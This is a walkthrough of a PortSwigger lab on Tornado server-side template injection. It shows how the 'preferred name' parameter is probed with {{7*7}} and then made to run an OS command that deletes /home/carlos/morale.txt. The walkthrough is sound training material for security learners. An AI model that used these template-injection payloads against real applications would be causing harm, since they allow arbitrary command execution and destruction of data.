# PortSwigger Lab Walkthrough — Basic server-side template injection (code context)

## Overview

First, I looked for the functionality where I could test for a possible injection vulnerability. After logging in and inspecting the **My account** page, I found the **Preferred name** functionality. The lab hint also suggested taking a closer look at this feature.

I then captured the request, identified the `blog-post-author-display` parameter, and tested whether it was vulnerable to Server-Side Template Injection (SSTI). After confirming that Tornado template expressions were being evaluated, I confirmed code execution, corrected an initial file-path mistake, deleted the target file, and successfully solved the lab.

## Objective

The objective of this lab was to exploit **Server-Side Template Injection (SSTI)** in a Tornado template and delete the following file:

```text
/home/carlos/morale.txt
````

## 1. Identify the Vulnerable Functionality

After logging in, I inspected the **My account** page and found the **Preferred name** functionality.

The page contained the following options:

```html
<select id="blog-post-author-display"
        name="blog-post-author-display">
    <option value="user.name" selected>Name</option>
    <option value="user.first_name">First Name</option>
    <option value="user.nickname">Nickname</option>
</select>
```

The lab hint specifically mentioned the **Preferred name** functionality, so I focused on this feature as a possible injection point.

## 2. Find the Request

After changing the preferred name and clicking **Submit**, I captured the request:

```http
POST /my-account/change-blog-post-author-display HTTP/2
```
<img width="744" height="696" alt="screenshot_20260824_133101" src="https://github.com/user-attachments/assets/8f7ca28c-0ca8-4aab-8b28-8feab107e2a8" />

The request contained the following parameter:

```text
blog-post-author-display=user.first_name
```

Since this value was processed by the application, I sent the request to **Burp Repeater** for further testing.

## 3. Test for SSTI

The lab indicated that the application used a **Tornado template**, so I tested whether Tornado expressions were being evaluated.

I changed the parameter value to:

```text
{{7*7}}
```
<img width="744" height="648" alt="screenshot_20260824_133147" src="https://github.com/user-attachments/assets/523f5107-337d-4ad7-b3f2-f9914da4c2ba" />

If the server evaluates the expression and displays:

```text
49
```

this confirms that the input is being interpreted as a Tornado template expression instead of normal text.

<img width="1920" height="1080" alt="screenshot_20260824_133031" src="https://github.com/user-attachments/assets/3ba73544-76ce-4ee4-9539-b6a7d1af4277" />

This successfully confirmed the SSTI vulnerability.

## 4. Understand the Vulnerability

Tornado templates can evaluate Python expressions using the following syntax:

```text
{{ ... }}
```

After confirming template expression evaluation, the vulnerability could potentially be escalated to Python code execution.

The vulnerability chain was:

```text
Preferred name functionality
        ↓
blog-post-author-display parameter
        ↓
Tornado template evaluation
        ↓
{{ Python expression }}
        ↓
Python code execution
        ↓
OS command execution
```

## 5. Execute the Required Command

After confirming the SSTI vulnerability, I used Python functionality to execute the required command:

```text
{{__import__("os").system("rm /home/carlos/morale.txt")}}
```

I placed this payload in the `blog-post-author-display` parameter and sent the request.

## 6. Troubleshooting the File Path

During my first attempt, I received the following error:

```text
rm: cannot remove 'home/carlos/morale.txt': No such file or directory
```
<img width="1920" height="1080" alt="screenshot_20260824_133444" src="https://github.com/user-attachments/assets/72639b6c-102c-4611-bf12-6096e42401b6" />


This was useful because it showed that the command was being executed, but the file path was incorrect.

The incorrect path was:

```text
home/carlos/morale.txt
```

The problem was the missing leading `/`.

The correct absolute path was:

```text
/home/carlos/morale.txt
```

I corrected the payload to:

```text
{{__import__("os").system("rm /home/carlos/morale.txt")}}
```

After sending the corrected payload, the target file was deleted and the lab was successfully solved.
<img width="1920" height="1080" alt="screenshot_20260824_133535" src="https://github.com/user-attachments/assets/42cc2673-69db-49e8-9b32-14551ce01242" />





